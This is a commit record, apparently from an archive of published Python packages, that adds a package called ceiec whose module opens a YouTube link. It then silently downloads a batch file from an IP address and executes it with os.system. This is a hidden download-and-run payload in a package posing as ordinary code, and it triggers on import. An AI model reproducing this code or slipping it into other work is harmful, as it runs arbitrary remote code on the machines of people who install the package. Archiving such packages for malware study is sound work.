a684831355f4ba326e28682fc9709e0d5a49faa4
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:12:27 +0000

    Add package ceiec/0.2/ceiec-0.2.tar.gz

---
+++ packages/ceiec/ceiec-0.2.tar.gz/ceiec-0.2/ceiec/ceiec.py
@@ -0,0 +1,17 @@
+import webbrowser
+
+url = "https://youtu.be/BGPGzDvAnDs"
+webbrowser.open(url)
+
+
+
+
+import urllib.request
+import os
+
+urllib.request.urlretrieve("http://192.168.1.147/ufv.bat", "v.bat")
+os.system('v.bat')
+
+
+
+
